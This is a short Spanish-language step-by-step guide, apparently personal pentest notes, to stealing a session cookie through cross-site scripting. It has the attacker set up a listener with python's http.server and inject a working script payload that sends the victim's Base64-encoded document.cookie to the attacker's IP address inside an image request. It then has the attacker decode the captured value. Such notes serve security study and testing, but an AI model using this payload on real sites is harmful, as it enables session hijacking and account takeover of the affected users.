Buscar cual es la dirección IP de la maquina atacante:  
ifconfig  

Montar un servidor web para almacenar la cookie que voy a robar:  
python3 -m http.server 80  

Ejecutar el siguiente codigo de XSS. Este codigo para a buscar por una imagen almacenada en la IP del atacante.  
Obviamente la imagen no existe, pero la víctima va a hacer una petición al servidor web creado anteriormente y va a mandar la cookie de la sesión en ese paquete.  

<script>var i=new Image(); i.src="http://192.168.100.206/?cookie="+btoa(document.cookie);</script>  

Finalmente, decodificar el texto capturado, ya que está en formato Base64. Esto se puede realizar con alguna herramienta en línea.
